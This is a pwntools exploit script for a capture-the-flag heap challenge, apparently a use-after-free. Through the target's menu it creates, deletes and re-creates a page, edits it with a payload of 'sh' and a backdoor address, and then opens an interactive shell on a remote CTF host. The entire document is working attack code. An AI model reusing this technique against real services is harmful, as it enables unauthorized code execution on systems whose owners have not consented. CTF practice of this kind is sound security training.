from pwn import *

context.update(arch="i386", os="linux", log_level="debug")
context.terminal=["qterminal", "-e"]
backdoor = 0x8048642
paylaod=b'sh\x00\x00'+p32(backdoor)
#p = process("./pwn")
p=remote('node4.anna.nssctf.cn',29000)
#gdb.attach(p,'b* 0x80486F9')
# creat
p.recvuntil(":")
sleep(0.1)
p.sendline("1")
# del
p.recvuntil(":")
sleep(0.1)
p.sendline("3")
p.recvuntil("page")
sleep(0.1)
p.sendline("0")
# creat
p.recvuntil(":")
sleep(0.1)
p.sendline("1")
# edit
p.recvuntil(":")
sleep(0.1)
p.sendline("2")
sleep(0.1)
p.sendline('1')
sleep(0.1)
p.sendline(paylaod)
# show
p.recvuntil(":")
sleep(0.1)
p.sendline("4")
sleep(0.1)
p.sendline("0")
p.interactive()